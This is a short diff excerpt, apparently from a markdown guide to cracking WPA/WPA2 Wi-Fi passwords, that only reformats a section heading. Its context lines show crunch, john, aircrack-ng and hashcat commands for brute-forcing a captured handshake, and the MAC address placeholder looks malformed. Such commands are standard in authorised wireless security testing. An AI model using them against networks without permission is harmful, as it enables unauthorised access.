@@ -147,7 +147,7 @@
   > crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
   > crunch 8 8 | john --stdin --restore=session1 | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
   ```
-   Method 5 - Cracking WPAWPA2 Much Faster Using GPU (hashcat - https://hashcat.net/hashcat/)
+   ##### Method 5 - Cracking WPAWPA2 Much Faster Using GPU (hashcat - https://hashcat.net/hashcat/)
 ```Bash
   > //convert .hcap to .hccapx (https://hashcat.net/cap2hccapx/)
   > hashcat -m 2500 -d 1 handshake.hccapx wordlist.txt
